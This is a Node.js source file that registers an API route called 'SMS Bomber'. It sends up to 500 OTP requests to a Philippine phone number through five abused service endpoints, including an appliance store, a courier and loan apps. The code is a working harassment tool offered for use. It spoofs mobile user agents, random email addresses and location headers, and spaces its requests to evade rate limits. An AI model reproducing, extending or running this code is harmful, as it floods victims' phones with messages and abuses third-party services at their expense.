const { importAsset } = require("../handlers/apiLoader");
const axios = require("axios");

function randomString(length) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function randomGmail() {
  return `${randomString(8)}@gmail.com`;
}

const providers = {
  abenson: {
    name: "Abenson",
    description: "Appliance Store OTP",
    send: async (phone) => {
      const { status } = await axios.post(
        "https://api.mobile.abenson.com/api/public/membership/activate_otp",
        `contact_no=${encodeURIComponent(phone)}&login_token=undefined`,
        {
          headers: {
            "User-Agent": "okhttp/4.9.0",
            "Content-Type": "application/x-www-form-urlencoded",
          },
          timeout: 15000,
        }
      );
      return status === 200;
    },
  },
  lbc: {
    name: "LBC Connect",
    description: "Delivery Service OTP",
    send: async (phone) => {
      const { status } = await axios.post(
        "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
        new URLSearchParams({
          verification_type: "mobile",
          client_email: randomGmail(),
          client_contact_code: "",
          client_contact_no: phone,
          app_log_uid: randomString(16),
        }).toString(),
        {
          headers: {
            "User-Agent": "Dart/2.19 (dart:io)",
            "Content-Type": "application/x-www-form-urlencoded",
          },
          timeout: 15000,
        }
      );
      return status === 200;
    },
  },
  excellent: {
    name: "Excellent Lending",
    description: "Loan Provider OTP",
    send: async (phone) => {
      const coords = [
        { lat: "14.5995", long: "120.9842" },
        { lat: "14.6760", long: "121.0437" },
        { lat: "14.8648", long: "121.0418" },
      ];
      const agents = ["okhttp/4.12.0", "okhttp/4.9.2", "Dart/3.6 (dart:io)"];
      const coord = coords[Math.floor(Math.random() * coords.length)];
      const agent = agents[Math.floor(Math.random() * agents.length)];

      await axios.post(
        "https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
        {
          domain: phone,
          cat: "login",
          previous: false,
          financial: "efe35521e51f924efcad5d61d61072a9",
        },
        {
          headers: {
            "User-Agent": agent,
            "Content-Type": "application/json; charset=utf-8",
            "x-latitude": coord.lat,
            "x-longitude": coord.long,
          },
          timeout: 8000,
        }
      );
      return true;
    },
  },
  wemove: {
    name: "WeMove",
    description: "Moving Service OTP",
    send: async (phone) => {
      const phoneNo = phone.startsWith("0") ? phone.substring(1) : phone;
      const { status } = await axios.post(
        "https://api.wemove.com.ph/auth/users",
        { phone_country: "+63", phone_no: phoneNo },
        {
          headers: {
            "User-Agent": "okhttp/4.9.3",
            "Content-Type": "application/json",
            xuid_type: "user",
            source: "customer",
            authorization: "Bearer",
          },
          timeout: 10000,
        }
      );
      return status === 200 || status === 201;
    },
  },
  honeyloan: {
    name: "Honey Loan",
    description: "Loan Service OTP",
    send: async (phone) => {
      await axios.post(
        "https://api.honeyloan.ph/api/client/registration/step-one",
        { phone: phone, is_rights_block_accepted: 1 },
        {
          headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15)",
            "Content-Type": "application/json",
          },
          timeout: 8000,
        }
      );
      return true;
    },
  },
};

const providerList = Object.keys(providers).map((k) => ({
  key: k,
  name: providers[k].name,
  desc: providers[k].description,
}));

const api = {
  name: "SMS Bomber",
  description:
    "Multi-provider SMS bomber tool. Sends OTP requests to a Philippine phone number via multiple service providers. Format: 09xxxxxxxxx",
  route: "/smsbomber",
  params: {
    "phone=": { type: "string", required: true },
    "provider=": { type: "string", required: true },
    "count=": { type: "int", required: false },
  },
  category: "Others",
  "api-key": true,
};

importAsset(api, async (params) => {
  const phone = params.phone;
  const providerKey = (params.provider || "").toLowerCase();
  const count = Math.min(Math.max(parseInt(params.count) || 1, 1), 500);

  if (!phone) {
    throw new Error(
      'Parameter "phone" is required. Format: 09xxxxxxxxx'
    );
  }

  const phoneClean = phone.replace(/[\s-]/g, "");
  if (!/^(09\d{9}|9\d{9}|\+639\d{9})$/.test(phoneClean)) {
    throw new Error(
      "Invalid phone number format. Use: 09xxxxxxxxx, 9xxxxxxxxx, or +639xxxxxxxxx"
    );
  }

  if (!providerKey) {
    return {
      status: false,
      error: 'Parameter "provider" is required.',
      available_providers: providerList,
    };
  }

  if (!providers[providerKey]) {
    return {
      status: false,
      error: `Unknown provider "${providerKey}".`,
      available_providers: providerList,
    };
  }

  const provider = providers[providerKey];
  let success = 0;
  let failed = 0;
  const results = [];

  for (let i = 0; i < count; i++) {
    try {
      const ok = await provider.send(phoneClean);
      if (ok) {
        success++;
        results.push({ attempt: i + 1, status: "success" });
      } else {
        failed++;
        results.push({ attempt: i + 1, status: "failed" });
      }
    } catch (e) {
      failed++;
      results.push({ attempt: i + 1, status: "failed", error: e.message });
    }

    if (i < count - 1) {
      await new Promise((r) =>
        setTimeout(r, 2000 + Math.random() * 2000)
      );
    }
  }

  return {
    provider: provider.name,
    target: phoneClean,
    total: count,
    success,
    failed,
    results,
  };
});
